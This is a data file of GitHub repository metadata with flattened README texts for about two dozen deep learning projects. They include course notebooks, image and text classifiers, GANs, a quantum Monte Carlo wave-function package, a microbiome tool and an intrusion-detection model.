pablozamudio,workshop-categorizacion-productos,n/a,Products Categorization Workshop Practical content for Products Categorization with Deep Learning Workshop Contents intropythonnumpypandas ipynb a notebook with basic samples of python numpy pandas trainnnproductscategorization ipynb a notebook with a sample NN training incluiding dataset preparation builiding training evaluation of a sample model Products Categorization with Deep Learning pdf slides for the workshop Branches master trainnnproductscategorization ipynb with solutions for first 1st 2nd sections Gather Explore Data solutionb trainnnproductscategorization ipynb with aditional solutions for 3rd section Prepare data for training solutionc trainnnproductscategorization ipynb with aditional solutions for 4th 5th 6th sections Build Train Evaluate Model Environment All notebooks can be run in Collaboratory https colab research google com platform and also standalone as long as you have python 3 6 installed,2019-09-04T12:48:49Z,2019-09-30T21:21:51Z,Jupyter Notebook,pablozamudio,User,2,2,3,17,master,pablozamudio,1,0,0,0,0,0,0
anspire,Notebooks,n/a,Notebooks Computer Vision and Deep Learning IPython notebooks Computer Vision and Image Processing CustomObjectDetectorusingyolov3 ipynb Training Custom Object Detector using yolov3 Colab https colab research google com assets colab badge svg https colab research google com github Anspire Notebooks blob master CustomObjectDetectorusingyolov3 ipynb Download https img shields io badge Download Notebook blue https anspire github io git raw html url https raw githubusercontent com Anspire Notebooks master CustomObjectDetectorusingyolov3 ipynb message https img shields io badge darknet lightgrey Transferlearningbasedclassifiertoclassifybenignmalignanttumor ipynb Training Transfer learning based classifier to classify benign malignant tumor on Warwick QU dataset https warwick ac uk fac sci dcs research tia glascontest download on MobileNetV2 Colab https colab research google com assets colab badge svg https colab research google com github Anspire Notebooks blob master Transferlearningbasedclassifiertoclassifybenignmalignanttumor ipynb Download https img shields io badge Download Notebook blue https anspire github io git raw html url https raw githubusercontent com Anspire Notebooks master Transferlearningbasedclassifiertoclassifybenignmalignanttumor ipynb message https img shields io badge keras lightgrey UsingOtsusmethodforsegmentation ipynb Using Otsus method to generate data for training of deep learning image segmentation models Colab https colab research google com assets colab badge svg https colab research google com github Anspire Notebooks blob master UsingOtsu E2 80 99smethodforsegmentation ipynb Download https img shields io badge Download Notebook blue https anspire github io git raw html url https raw githubusercontent com Anspire Notebooks master UsingOtsu E2 80 99smethodforsegmentation ipynb message https img shields io badge opencv lightgrey Multiclassclassifiertorecognizesignlanguage ipynb Multi class classifier to recognize sign language Colab https colab research google com assets colab badge svg https colab research google com github Anspire Notebooks blob master Multiclassclassifiertorecognizesignlanguage ipynb Download https img shields io badge Download Notebook blue https anspire github io git raw html url https raw githubusercontent com Anspire Notebooks master Multiclassclassifiertorecognizesignlanguage ipynb message https img shields io badge keras lightgrey HorsesvshumansusingTransferLearning ipynb Horses and humans classification using pre trained InceptionV3 Network Colab https colab research google com assets colab badge svg https colab research google com github Anspire Notebooks blob master HorsesvshumansusingTransferLearning ipynb Download https img shields io badge Download Notebook blue https anspire github io git raw html url https raw githubusercontent com Anspire Notebooks master HorsesvshumansusingTransferLearning ipynb message https img shields io badge keras lightgrey GANkeras ipynb Simple GAN trained on MNIST dataset Colab https colab research google com assets colab badge svg https colab research google com github Anspire Notebooks blob master GANkeras ipynb Download https img shields io badge Download Notebook blue https anspire github io git raw html url https raw githubusercontent com Anspire Notebooks master GANkeras ipynb message https img shields io badge keras lightgrey GANPyTorch ipynb Simple GAN trained on MNIST dataset Colab https colab research google com assets colab badge svg https colab research google com github Anspire Notebooks blob master GANPyTorch ipynb Download https img shields io badge Download Notebook blue https anspire github io git raw html url https raw githubusercontent com Anspire Notebooks master GANPyTorch ipynb message https img shields io badge pytorch lightgrey CatsvsDogsclassifier ipynb Classify cats and dogs Colab https colab research google com assets colab badge svg https colab research google com github Anspire Notebooks blob master CatsvsDogsclassifier ipynb Download https img shields io badge Download Notebook blue https anspire github io git raw html url https raw githubusercontent com Anspire Notebooks master CatsvsDogsclassifier ipynb message https img shields io badge keras lightgrey Blurringimage ipynb Blurring image using opencv Colab https colab research google com assets colab badge svg https colab research google com github Anspire Notebooks blob master Blurringimage ipynb Download https img shields io badge Download Notebook blue https anspire github io git raw html url https raw githubusercontent com Anspire Notebooks master Blurringimage ipynb message https img shields io badge opencv lightgrey Thresholdingimage ipynb Thresholding image using opencv Colab https colab research google com assets colab badge svg https colab research google com github Anspire Notebooks blob master Thresholdingimage ipynb Download https img shields io badge Download Notebook blue https anspire github io git raw html url https raw githubusercontent com Anspire Notebooks master Thresholdingimage ipynb message https img shields io badge opencv lightgrey Handwritingdigitsrecognition ipynb Handwriting digits recognition on MNIST without convolutions Colab https colab research google com assets colab badge svg https colab research google com github Anspire Notebooks blob master Handwritingdigitsrecognition ipynb Download https img shields io badge Download Notebook blue https anspire github io git raw html url https raw githubusercontent com Anspire Notebooks master Handwritingdigitsrecognition ipynb message https img shields io badge keras lightgrey Intelimageclassificationfromkaggledataset ipynb Classification of Natural Scenes Colab https colab research google com assets colab badge svg https colab research google com github Anspire Notebooks keras blob master Intelimageclassificationfromkaggledataset ipynb Download https img shields io badge Download Notebook blue https anspire github io git raw html url https raw githubusercontent com Anspire Notebooks master Intelimageclassificationfromkaggledataset ipynb message https img shields io badge keras lightgrey unetkeras ipynb Implementaion of unet in keras Colab https colab research google com assets colab badge svg https colab research google com github Anspire Notebooks blob master unetkeras ipynb Download https img shields io badge Download Notebook blue https anspire github io git raw html url https raw githubusercontent com Anspire Notebooks master unetkeras ipynb message https img shields io badge keras lightgrey maskrcnnkeras ipynb Using Mask RCNN to segment images Colab https colab research google com assets colab badge svg https colab research google com github Anspire Notebooks blob master maskrcnnkeras ipynb Download https img shields io badge Download Notebook blue https anspire github io git raw html url https raw githubusercontent com Anspire Notebooks master maskrcnnkeras ipynb message https img shields io badge keras lightgrey Data preprocessing Downloadingdatasetfromkaggle ipynb Download dataset from kaggle to local system Colab https colab research google com assets colab badge svg https colab research google com github Anspire Notebooks blob master Downloadingdatasetfromkaggle ipynb Download https img shields io badge Download Notebook blue https anspire github io git raw html url https raw githubusercontent com Anspire Notebooks master Downloadingdatasetfromkaggle ipynb message https img shields io badge kaggle lightgrey Contributing Pull requests are welcome For major changes please open an issue first to discuss what you would like to change Please make sure to update tests as appropriate License MIT https choosealicense com licenses mit,2019-09-05T11:44:47Z,2019-11-07T20:03:34Z,Jupyter Notebook,anspire,User,1,2,2,4,master,anspire,1,0,0,0,0,0,0
parhamzm,DeepLearning,n/a,DeepLearning This Repository is for getting Used to the Deep Learning and start to build you own Deep Learning Applications,2019-09-04T06:11:11Z,2019-11-24T20:54:10Z,Jupyter Notebook,parhamzm,User,1,2,0,5,master,parhamzm,1,0,0,0,0,0,0
zyavuz610,deepLearning_inKTU,n/a,Deep Learning Bu depo Karadeniz Teknik niversitesinde yaptm yapay zeka almalar ile ilgili kodlar aylatm depodur Yapay Zeka bgnlerde ok popler bir konu ya da alma alan Bu konuya hakim olmak ve arkaplanda neler olup bittiini anlamak iin aadaki konu srasn takip etmenizi neririm Lineer Resgresion Dorusal regresyon deeri hesaplamak iin kullanlr 1 deikenli ve ok deikenli versiyonlar vardr Temelde bu ikisi arasnda ok bir fark bulunmamaktadr Logistic Resression kili snflandrma yapmak iin kullanlan bir regresyon eitidir Lineer regresyonla benzer ekilde alr En nemli fark lineer regresyondaki kt ayrca bir transfer fonksiyonuna genelde sigmoid verilir Bu sayede kt lineer bir deer yerine 0 ya da 1 e yakn deerler elde edilir 0 5 eik kullanarak sonuc 0 ya da 1 eklinde ikili sayya evrilebilir Neural Network Tek katmanl ya da ok katmanl yani farkl mimarilere sahip sinir alar aslnda bir ok nron dediimiz sinir hcresinden oluur Her bir sinir hcresi tek bana deerlendirildiinde logistic regresyon yapan bir snflandrc gibi dnlebilir Derin renme kefediltikten sonra bu tr alara s sinir alar da denilmektedir Deep Learning Sinir alarnn katman says artttrlm eklidir,2019-09-14T17:31:01Z,2019-11-01T13:20:19Z,Jupyter Notebook,zyavuz610,User,1,2,0,9,master,zyavuz610,1,0,0,0,0,0,0
Shivam0712,DeepLearningProjects,n/a,DeepLearningProjects The exponential growth in the number of complex datasets every year requires more enhancement in machine learning methods to provide robust and accurate data classification Lately deep learning approaches are achieving better results compared to previous machine learning algorithms on tasks like image classification natural language processing face recognition etc The success of these deep learning algorithms relies on their capacity to model complex and non linear relationships within the data In this repository you will find a series of projects notebooks using Deep Learning to solve problems from different fields DeepLearningforTextClassfication Text classification is extensively used in industry today for sentiment analysis In this project we build different type of fundamental deep learning architectures such as DNN CNN RNN RCNN using Pytroch Lightning Pytorch Lightning is a very lightweight wrapper on PyTorch It provides a framework to standardize research codes and is recommnded by NeurIPS Conference Image description https github com Shivam0712 DeepLearningProjects blob master DLforTextClassification images TextClassification png SemiSupervisedLearningforImageClassification The application of deep learning is rapidly growing in the field of computer vision and is helping in building robust classification and identification models However to witness this superior performance a large amount of human labelled dataset is required a luxury that is not available across all domains To counter this problem the possible solutions are Transfer Learning Data Augmentation Semi Supervised Learning In Semi Supervised learning prior to the training of the network on actual image classification task we train the network on an arbitary task to learn robust low level features this helps to improve models performance in case of low number of labelled training image samples,2019-09-09T01:25:09Z,2019-09-24T19:10:16Z,Jupyter Notebook,Shivam0712,User,2,2,0,81,master,Shivam0712,1,0,0,0,0,0,0
Practical-AI,DeepLearningIntro,n/a,DeepLearningIntro This repository is created for the Deep Learning course which has been held in Khaje Nasir Toosi University in 2019 summer You can find the vidoes of the course in the following youtube channel https www youtube com watch v Ci52ZqvpdP0 list PL2g5adpoaeJfYvFr3qwxETRnICyc5BmS The code and material of this repository belong to introduction course I m Pooya Mohammadi and you can contact me from one of the following ways telegram id PooyaMohammadiK email pooya209 ymail com,2019-09-18T19:33:44Z,2019-11-27T09:34:07Z,Jupyter Notebook,Practical-AI,User,1,2,0,9,master,Practical-AI#Pooya-Mohammadi-K,2,0,0,0,0,0,0
zwzwtao,Deep-Learning,n/a,Deep Learning This repo contains all of my works on Deep Learning for more traditional ML models please refer to https github com zwzwtao Machine Learning,2019-08-08T02:57:35Z,2019-11-18T13:41:41Z,Jupyter Notebook,zwzwtao,User,2,2,1,19,master,zwzwtao,1,0,0,0,0,0,0
akjadon,Deep-Learning,n/a,Deep Learning,2019-09-15T05:47:12Z,2019-09-18T15:57:43Z,Jupyter Notebook,akjadon,User,1,2,0,2,master,akjadon,1,0,0,0,0,0,0
NLESC-JCER,DeepQMC,n/a,DeepQMC Deep Learning for Quantum Monte Carlo Simulations Build Status https travis ci com NLESC JCER DeepQMC svg branch master https travis ci com NLESC JCER DeepQMC Coverage Status https coveralls io repos github NLESC JCER DeepQMC badge svg branch master https coveralls io github NLESC JCER DeepQMC branch master Codacy Badge https api codacy com project badge Grade 5d99212add2a4f0591adc6248fec258d https www codacy com manual NicoRenaud DeepQMC utmsource github com amputmmedium referral amputmcontent NLESC JCER DeepQMC amputmcampaign BadgeGrade Introduction DeepQMC allows to leverage deep learning to optimize QMC wave functions The package offers solutions to optimize particle in a box model as well as molecular systems It uses pytorch as a deep learning framework and pyscf to obtain the first guess of the molecular orbitals The three main ingredients of any calculations are a neural network that calculates the value of the wave function at a given point a sampler able to generate sampling points of the wave function an optimizer as those provided by pytorch Harmonic Oscillator in 1D The script below illustrates how to optimize the wave function of the one dimensional harmonic oscillator DeepQMC python import torch import torch optim as optim from deepqmc sampler metropolis import Metropolis from deepqmc wavefunction wfpotential import Potential from deepqmc solver solverpotential import SolverPotential from deepqmc solver plotpotential import plotresults1d plotter1d analytic solution of the problem def solfunc pos return torch exp 0 5 pos 2 box domain ncenter xmin 5 xmax 5 5 potential function def potfunc pos Potential function desired return 0 5 pos 2 wavefunction wf Potential potfunc domain ncenter nelec 1 sampler sampler Metropolis nwalkers 250 nstep 1000 stepsize 1 nelec wf nelec ndim wf ndim domain min 5 max 5 optimizer opt optim Adam wf parameters lr 0 01 define solver solver SolverPotential wf wf sampler sampler optimizer opt train the wave function plotter plotter1d wf domain 50 sol solfunc solver run 100 loss variance plot plotter plot the final wave function plotresults1d solver domain 50 solfunc e0 0 5 The potfunc function defines the potential for which we want to optimize the wave function It is here given by a simple quadratic function After defining the domain in domain and the number of basis function in ncenter we instantiate the Potential wave function class This class defines a very simple neural network that given a position computes the value of the wave function at that point This neural network is composed of a layer of radial basis functions followed by a fully connected layer to sum them up We then instantiate the sampler here a simple Metroplis scheme The sampler is used to sample the wave function and hence generate a bach of sampling points These points are used as input of the neural network the compute the values of wave function at those points We finally select the Adam optimizer to optimize the wave function paramters We then define a SolverPotential instance that ties all the elements together and train the model to optimize the wave function paramters We here use the variance of the sampling point energies as a loss and run 100 epochs Many more parameters are accessible in the training routines After the optimization the following result is obtained After otpimization the following trajectory can easily be generated The same procedure can be done on different potentials The figure below shows the performace of the method on the harmonic oscillator and the morse potential Dihydrogen molecule DeepQMC also allows optimizing the wave function and the geometry of molecular systems through the use of dedicated classes For example the small script below allows to compute the energy of a H2 molecule using a few lines python import sys from torch optim import Adam from deepqmc wavefunction wforbital import Orbital from deepqmc solver solverorbital import SolverOrbital from deepqmc sampler metropolis import Metropolis from deepqmc wavefunction molecule import Molecule from deepqmc solver plotdata import plotobservable define the molecule mol Molecule atom H 0 0 0 37 H 0 0 0 37 basistype sto basis sz define the wave function wf Orbital mol sampler sampler Metropolis nwalkers 1000 nstep 1000 stepsize 0 5 ndim wf ndim nelec wf nelec move one optimizer opt Adam wf parameters lr 0 01 solver solver SolverOrbital wf wf sampler sampler optimizer opt optimize the geometry solver configure task geoopt solver run 100 loss energy plot the data plotobservable solver obsdict e0 1 16 The main difference compared to the harmonic oscillator case is the definition of the molecule via the Molecule class and the definition of the wave function that is now given by the Orbital class The Molecule object specifies the geometry of the system and the type of orbitals required So far only sto and gto are supported The Orbital class defines a neural network encoding the wave fuction ansatz The network takes as input the positions of the electrons in the system and compute the corresponding value of the wave function using the architecture depicted below Starting from the positions of the electrons in the system we have define an AtomicOrbital layer that evaluates the values of all the atomic orbitals at all the electron positions This is in spirit similar to the RBF layer used in the Potential wave function used in the previous example The AtomicOrbital layer has several variational paramters atomic positions basis function exponents and coefficients These parameters can be optimized during the training The network then computes the values of the molecular orbitals from those of the atomic orbitals This achieved by a simple linear layer whose transformation matrix is given by the molecular orbital coefficients These coefficients are also variational parameters of the layer and can therefore be optimized We then have defined a SlaterPooling layer that computes the values of all the required Slater determinants The SlaterPooling operation is achieved by masking the molecular orbitals contained in the determinant and by then taking the determinant of this submatrix We have implemented BatchDeterminant layer to accelerate this operation Finally a fully connected layer sums up all the determinants The weight of this last layer are the CI coefficients that can as well be optimized In parallel we also have defined a JastrowFactor layer that computes the e e distance and the value of the Jastrow factor There again the parameters of the layer can be optimized during the training of the wave function The script presented above configures then the solver to run a geometry optimization on the model using the energy of the sampling points as a loss The figure below shows the evolution of the system s eneergy during the geometry optimization of the molecule,2019-08-14T13:51:36Z,2019-12-13T10:11:13Z,Python,NLESC-JCER,Organization,3,2,1,279,master,NicoRenaud,1,0,0,2,3,0,8
chapter19,Deep-Learning-with-Python,n/a,Deep Learning with Python Python KerasFranois Chollet Keras Keras Kaggle 98 1 1 WhatIsDeepLearning ipynb 2 2 MathematicalBasisOfNeuralNetwork ipynb 3 3 GettingStartedWithNeuralNetworks ipynb 4 4 MachineLearningFoundation ipynb,2019-08-08T15:38:35Z,2019-08-10T14:51:14Z,Jupyter Notebook,chapter19,User,1,2,0,4,master,chapter19,1,0,0,0,0,0,0
samarth0174,Intrusion-Detection-Deep-Learning,n/a,Intrusion Detection using Deep Learning Using Deep learning models an Intrusion Detection System is Developed which alerts provides security from different types of cyber attacks like DOS Revere proxy and other attacks The model classifies can detectt suspecious network behaviour on the basis of 42 characterstics The model can classify different kind of attacks and can alert the system about the any attack behaviour,2019-08-30T15:04:27Z,2019-11-03T11:25:47Z,Jupyter Notebook,samarth0174,User,1,2,1,10,master,samarth0174#nikhiljainjain,2,0,0,0,0,0,1
taufikfathurahman,Dive-into-Deep-Learning,n/a,Dive into Deep Learning,2019-09-15T12:26:12Z,2019-12-10T10:16:29Z,Jupyter Notebook,taufikfathurahman,User,1,2,0,11,master,taufikfathurahman,1,0,0,0,0,0,0
HussainMurtaza53,Deep_Learning_With_Keras,n/a,DeepLearningWithKeras Deep learning Practice,2019-08-13T12:49:45Z,2019-08-25T14:28:58Z,Jupyter Notebook,HussainMurtaza53,User,1,2,0,3,master,HussainMurtaza53,1,0,0,0,0,0,0
DokkarRachidReda,Deep-Learning-Models,n/a,Deep Learning Models collection of my deep learning models Resources tutorialspoint https www tutorialspoint com to learn Numpy Pandas Intro to Deep Learning with PyTorch https classroom udacity com courses ud188 Udacity course to learn about deep learning Kaggle https www kaggle com to find datasets and challengs Colab https colab research google com to train models in gpu for free Content Digits Recognizer model from 28x28x1 images MNIST dataset the challenge from Kaggle digit recognizer https www kaggle com c digit recognizer you can find this model in Digits ipynb Titanic3 Dataset analyse and survive prediction using MLP pytorch I got 84 accuracy you can find the dataset description here http campus lakeforest edu frank FILES MLFfiles Bio150 Titanic TitanicMETA pdf and the dataset here http biostat mc vanderbilt edu wiki pub Main DataSets titanic3 xls the model is in Titanic3 ipynb Arabic Letters classifier using pytorch MLP the data is 32x32x3 images I got 73 accuracy the CNN model on the other hand performed much better the test accuracy is 84 9 in 36 epoch the MLP was trained on 150 epoch you can find the MLP model in arabic ipynb the CNN model in arabicCNN ipynb and the data in Datasets arabic the data is structred to be loaded directly to pytorch ImageFolder Dataset AI hack tunisia precalificacion is a ML challenge to predict if an african have a bank account it s also a precalificacion for AI hack tunisia I got an accuracy of 99 89 you can find the challenge online here http zindi africa competitions financial inclusion in africa Contribution feel free to contribute or to report any error or improvment to any model i would be happy to add your model here too,2019-08-12T18:00:45Z,2019-12-09T13:27:18Z,Jupyter Notebook,DokkarRachidReda,User,1,2,1,22,master,DokkarRachidReda#younes38,2,0,0,0,0,0,1
fish-kong,Deep-extreme-learning-mechine,n/a,Deep extreme learning mechine QQ 392503054,2019-08-31T14:04:32Z,2019-09-04T07:22:29Z,MATLAB,fish-kong,User,1,2,0,2,master,fish-kong,1,0,0,0,0,0,0
hibetterheyj,tju_deep_learning,n/a,Course repo for Deep learning Tongji Univ Elective Course Three assignments as of 19 10 18 respectively Course info Supervised by Professor Yin Wang http web eecs umich edu yinw Python basics Linear regression Logistic regression NN basics Convolutional neural network Object detection Style transfer Assignments Using nbviewer https nbviewer jupyter org for better and faster rendering 1 Linear 2 Logistic multiple binary classifiers method regression notebook1 https nbviewer jupyter org github hibetterheyj tjudeeplearning blob master assignment 231 assignment1 1 ipynb notebook2 https nbviewer jupyter org github hibetterheyj tjudeeplearning blob master assignment 231 assignment1 2 ipynb 1 Logistic softmax method regression 2 Fully connected neural network notebook1 https nbviewer jupyter org github hibetterheyj tjudeeplearning blob master assignment 232 softmax mnist ipynb notebook2 https nbviewer jupyter org github hibetterheyj tjudeeplearning blob master assignment 232 shallownn mnist torch ipynb Convolutional neural network implemented via 1 PyTorch 2 Fastai notebook1 https nbviewer jupyter org github hibetterheyj tjudeeplearning blob master assignment 233 cifar cnn ipynb notebook2 https nbviewer jupyter org github hibetterheyj tjudeeplearning blob master assignment 233 CIFAR Fastai ipynb Re implemented one style transfer algorithm MSG Net via PyTorch notebook https nbviewer jupyter org github hibetterheyj tjudeeplearning blob master assignment 234 HYJ Minimum Pack He Yujie msgnet ipynb Weekly solution and codes are available in ipynb Best wishes ipynb Others For other solution you can refer to thumbsup ShallowDock DLcourse https github com ShallowDock DLcourse,2019-09-17T08:41:57Z,2019-11-12T12:55:17Z,Jupyter Notebook,hibetterheyj,User,1,2,0,17,master,hibetterheyj,1,0,0,0,0,0,0
Nielspace,Deep-Learning-with-GAN,n/a,Generative Adversarial Network This repo is inspired from the book named Generative Deep Learning and also Deep Learning,2019-09-18T04:23:05Z,2019-12-06T12:41:10Z,Jupyter Notebook,Nielspace,User,1,2,0,13,master,Nielspace,1,0,0,0,0,0,0
btwardow,Awsome-Deep-Metric-Learning,n/a,Awsome Deep Metric Learning A curated list of resources dedicated to metric learning with neural networks deep learning Papers Learning a similarity metric discriminatively with application to face verification 2005 Siamise Network Contrastive Loss pdf http www cs utoronto ca hinton csc253506 readings chopra 05 pdf Learning Fine grained Image Similarity with Deep Ranking CVPR 2014 pdf https users eecs northwestern edu jwa368 pdfs deepranking pdf Deep metric learning using triplet network ICLR 2015 pdf https arxiv org pdf 1412 6622 pdf Facenet A unified embedding for face recognition and clustering CVPR 2015 pdf https arxiv org pdf 1503 03832 Improved deep metric learning with multi class N pair loss objective NIPS 2016 pdf http www nec labs com uploads images Department Images MediaAnalytics papers nips16npairmetriclearning pdf Deep metric learning via lifted structured feature embedding CVPR 2016 pdf http cvgl stanford edu papers songcvpr16 pdf code https github com rksltnl Deep Metric Learning CVPR16 A discriminative feature learning approach for deep face recognition ECCV 2016 Center Loss pdf https kpzhang93 github io papers eccv2016 pdf code https github com ydwen caffe face Deep metric learning with angular loss CVPR 2017 pdf http openaccess thecvf com contenticcv2017 html WangDeepMetricLearningICCV2017paper html Beyond Triplet Loss A Deep Quadruplet Network for Person Re identification CVPR 2018 pdf https arxiv org pdf 1704 01719 pdf Deep Metric Learning with BIER Boosting Independent Embeddings Robustly PAMI 2018 pdf https arxiv org pdf 1801 04815 pdf Deep Metric Learning with Hierarchical Triplet Loss ECCV 2018 pdf http openaccess thecvf com contentECCV2018 papers GeDeepMetricLearningECCV2018paper pdf Deep Randomized Ensembles for Metric Learning ECCV2018 pdf https arxiv org pdf 1808 04469 pdf Multi Similarity Loss with General Pair Weighting for Deep Metric Learning CVPR 2019 pdf http openaccess thecvf com contentCVPR2019 papers WangMulti SimilarityLossWithGeneralPairWeightingforDeepMetricLearningCVPR2019paper pdf code https github com MalongTech research ms loss Hardness Aware Deep Metric Learning CVPR 2019 pdf http openaccess thecvf com contentCVPR2019 papers ZhengHardness AwareDeepMetricLearningCVPR2019paper pdf Divide and Conquer the Embedding Space for Metric Learning CVPR 2019 pdf http openaccess thecvf com contentCVPR2019 papers SanakoyeuDivideandConquertheEmbeddingSpaceforMetricLearningCVPR2019paper pdf code https github com CompVis metric learning divide and conquer,2019-09-05T17:58:51Z,2019-10-30T13:15:41Z,n/a,btwardow,User,1,2,0,5,master,btwardow,1,0,0,0,0,0,0
shangeth,Google-Explore-ML-Deep-Learning,n/a,Images logo png MIT License Copyright c 2019 Shangeth Rajaa Permission is hereby granted free of charge to any person obtaining a copy of this software and associated documentation files the Software to deal in the Software without restriction including without limitation the rights to use copy modify merge publish distribute sublicense and or sell copies of the Software and to permit persons to whom the Software is furnished to do so subject to the following conditions The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software THE SOFTWARE IS PROVIDED AS IS WITHOUT WARRANTY OF ANY KIND EXPRESS OR IMPLIED INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM DAMAGES OR OTHER LIABILITY WHETHER IN AN ACTION OF CONTRACT TORT OR OTHERWISE ARISING FROM OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE,2019-08-26T17:28:24Z,2019-10-15T21:06:47Z,Jupyter Notebook,shangeth,User,0,2,0,50,master,shangeth,1,0,0,0,0,0,1
1904labs,Getting-Started-with-Deep-Learning,n/a,Getting Started with Deep Learning Getting Started with Deep Learning This repository contains Jupyter notebooks to accompany the STL Big Data Meetup presentation on Aug 7 2019 and the STL Python Meetup presentation on Sep 18 2019 The Google slides can be found here https docs google com presentation d 1Gq9tk3f8Mw9nos8zuzjc9kbxzVZQmJo1VxUwnB7h48 edit usp sharing To run notebooks you need a number of python libraries Option 1 Create a virtual env with python 3 6 and the dependencies in requirements txt Option 2 Build and run the included Dockerfile Note Be sure to mount a volume when running the Docker image so that your work is saved to your local drive,2019-08-07T20:43:51Z,2019-09-18T21:01:04Z,Jupyter Notebook,1904labs,Organization,2,2,1,7,master,mpitlyk#MattPitlyk,2,0,0,0,0,0,0
dhairyachandra,Module-1-Deep-Learning-ICP,n/a,Module 1 Deep Learning ICP CSEE5590 CS490 AI for Cybersecurity Assignments,2019-08-28T22:55:26Z,2019-10-24T14:18:39Z,Jupyter Notebook,dhairyachandra,User,1,2,0,12,master,dhairyachandra,1,0,0,0,0,0,0
Mrjaggu,music_generation_using_deep_learning,n/a,Music generation using deep learning Generating music using deep learning Real World problem This case study focuses on generating music automatically using Recurrent Neural Network RNN We do not necessarily have to be a music expert in order to generate music Even a non expert can generate a decent quality music using RNN We all like to listen interesting music and if there is some way to generate music automatically particularly decent quality music then it s a big leap in the world of music industry Task Our task here is to take some existing music data then train a model using this existing data The model has to learn the patterns in music that we humans enjoy Once it learns this the model should be able to generate new music for us It cannot simply copy paste from the training data It has to understand the patterns of music to generate new music We here are not expecting our model to generate new music which is of professional quality but we want it to generate a decent quality music which should be melodious and good to hear Now what is music In short music is nothing but a sequence of musical notes Our input to the model is a sequence of musical events notes Our output will be new sequence of musical events notes In this case study we have limited our self to single instrument music as this is our first cut model In future we will extend this to multiple instrument music Type of Data There are total of 405 music tunes in abc notation Prerequisites You need to have installed following softwares and libraries in your machine before running this project Python 3 libraries which are needed like sklearn pandas seaborn matplotlib numpy scipy keras Reference https towardsdatascience com how to generate music using a lstm neural network in keras 68786834d4c5 http karpathy github io 2015 05 21 rnn effectiveness,2019-09-15T10:29:20Z,2019-11-07T16:39:58Z,Python,Mrjaggu,User,1,2,0,4,master,Mrjaggu,1,0,0,0,0,0,0
imrahul361,Deep-Learning-and-Neural-Network-by-deeplearning.ai,n/a,Deep Learning and Neural Network by deeplearning ai,2019-08-17T20:19:39Z,2019-12-03T05:00:20Z,Python,imrahul361,User,1,2,0,2,master,imrahul361,1,0,0,0,0,0,0
ykrmm,AMAL,n/a,AMAL Advanced MAchine Learning Deep Learning The aim of this course is to cover the following concepts Introduction to deep learning Course and experimentations on state of the art architectures Deep neural Network architectures Convolutional neural network reccurents neural network Attention models Computational graph and autograd Framework for deeplearning pytorch tensor flow and CUDA programmation Deepening of the founding concepts of the machine learning Statistical learning theory generalizability bias variance dilemma PAC learning complexity etc Supervised Learning Classification Neural Networks Support Vector Machines Kernel Methods Gaussian Processes etc Optimization Unsupervised learning Clustering Matrix Factoring Latent Variable Models blends etc Other learning paradigms Low supervision learning Semi supervised and transductive learning Active learning Transfer Learning Learning and structured data Sequences and trees Graphs and interdependent data,2019-09-17T05:16:49Z,2019-12-03T09:26:52Z,Python,ykrmm,User,2,2,0,33,master,ykrmm#marc-treu,2,0,0,0,0,0,0
Young-won,deepbiome,n/a,DeepBiome image https img shields io travis Young won deepbiome svg target https travis ci org Young won deepbiome alt Build image https coveralls io repos github Young won deepbiome badge svg branch master target https coveralls io github Young won deepbiome branch master alt Coverage image https img shields io pypi v deepbiome svg target https pypi python org pypi deepbiome alt Version Deep Learning package using the phylogenetic tree information for microbiome abandunce data analysis Free software 3 clause BSD license Documentation COMING SOON https Young won github io deepbiome Installation Prerequisites python 3 5 Tensorflow Keras Install DeepBiome At the command line code block bash for python 3 x pip3 install git https github com Young won deepbiome git Features deepbiome deepbiometrain log networkinfo pathinfo numberoffold None maxqueuesize 10 workers 1 usemultiprocessing False Function for training the deep neural network with phylogenetic tree weight regularizer It uses microbiome abundance data as input and uses the phylogenetic taxonomy to guide the decision of the optimal number of layers and neurons in the deep learning architecture See ref url TODO update deepbiome deepbiometest log networkinfo pathinfo numberoffold None maxqueuesize 10 workers 1 usemultiprocessing False Function for testing the pretrained deep neural network with phylogenetic tree weight regularizer If you use the index file this function provide the evaluation using test index index set not included in the index file for each fold If not this function provide the evaluation using the whole samples deepbiome deepbiome deepbiomeprediction log networkinfo pathinfo numclasses numberoffold None maxqueuesize 10 workers 1 usemultiprocessing False Function for prediction by the pretrained deep neural network with phylogenetic tree weight regularizer Credits This package was builded on the Keras and the Tensorflow packages This package was created with Cookiecutter and the NSLS II scientific python cookiecutter project template Keras https keras io Tensorflow https www tensorflow org tutorials Cookiecutter https github com audreyr cookiecutter NSLS II scientific python cookiecutter https github com NSLS II scientific python cookiecutter,2019-09-12T23:19:26Z,2019-12-03T21:24:49Z,Python,Young-won,User,4,2,1,115,master,Young-won#Hua-Zhou,2,0,0,0,0,0,1
s2948044,DLNLP-Project,python3#pytorch#rationale#text-classification,Deep Learning for Natural Language Processing About This repository contains code for mini project of MSc course Deep Learning for Natural Language Processing Description We cover the classical NLP problem of question classification which consists of two parts Classification Task We choose Facebook s FastText as our baseline and further implement two neural models namely LSTM and TextCNN The three models are compared in terms of the overall classification accuracy and the precision recall and F1 score values for each category Rationale Extraction A layer of binary latent variables is added to our neural models that select what parts of the input expose features for classification This is used for better interpretability of our models Dataset The dataset we use can be found here https cogcomp seas upenn edu Data QA QC Prerequisites 1 Install the conda environment by running conda env create f environment yml 2 Then activate it by conda activate dlnlp 3 Optional Download the pre trained Word2Vec word embeddings https drive google com file d 0B7XkCwpI5KDYNlNUTTlSS21pQmM edit and unzip into folder preprocessing Running Instructions Optional Preprocess the dataset and extract word embeddings by running python m dataset Test the FastText model by running python m FastText mode eval Test the LSTM model by running python m LSTM mode eval Test the TextCNN model by running python m TextCNN mode eval Test the Rationale extraction model by running python m Rationale mode eval,2019-09-06T12:52:48Z,2019-10-08T15:02:32Z,Python,s2948044,User,0,2,2,89,master,s2948044#vincentwen1995#Robbie-Luo#yz2691,4,0,0,0,0,0,0
